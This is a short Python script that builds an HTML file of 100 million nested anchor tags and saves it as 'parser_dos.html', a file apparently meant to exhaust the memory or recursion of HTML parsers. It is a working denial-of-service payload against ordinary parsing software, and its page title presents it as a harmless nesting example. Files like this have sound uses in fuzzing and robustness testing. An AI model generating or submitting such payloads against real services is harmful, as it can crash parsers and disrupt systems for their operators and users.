num = 100000000
div = "<a>" * num + "</a>" * num

html_text = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deeply Nested HTML Example</title>
</head>
<body>
{div}
</body>
</html>
"""

with open("parser_dos.html", "w") as f:
    f.write(html_text)